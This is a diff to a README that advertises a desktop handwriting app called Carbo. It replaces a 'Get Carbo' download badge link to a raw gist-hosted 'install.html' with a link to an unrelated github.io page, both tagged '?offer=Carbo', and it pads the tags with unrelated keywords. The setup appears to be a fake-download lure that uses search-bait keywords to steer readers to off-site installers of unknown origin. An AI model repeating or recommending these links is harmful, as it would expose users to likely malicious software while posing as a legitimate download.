@@ -1,6 +1,6 @@
 # Carbo Download — Desktop Handwriting Capture  
 
-[![Get Carbo GitHub](https://img.shields.io/badge/Get%20Carbo%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/goofypsychonker879/55ee6d9a6c614e8c8ee9481f4d1231de/raw/3837d4e9e434b4307741107ab1f887c1ce33eeed/install.html?offer=Carbo)  
+[![Get Carbo GitHub](https://img.shields.io/badge/Get%20Carbo%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-deploy.github.io/.github/?offer=Carbo)  
 
 ---
 
@@ -63,7 +63,7 @@ A: Yes, Carbo integrates with iCloud, Dropbox, and local folders for easy syncin
 ---
 
 ## 🔍 Tags  
-Carbo, handwriting app, note capture, desktop notes, sketch digitizer, mac note tool, windows note organizer, creative notes, handwriting vectorizer, note management, Carbo pc, Carbo windows, Carbo desktop, Carbo for mac, Carbo for pc, Carbo for windows, Carbo mac 
+Carbo, carbo chem, carbo ceramic, carbo 3, carbo tech, handwriting app, note capture, desktop notes, sketch digitizer, mac note tool, windows note organizer, creative notes, handwriting vectorizer, note management, Carbo pc, Carbo windows, Carbo desktop, Carbo for mac, Carbo for pc, Carbo for windows, Carbo mac 
 
 ---
 
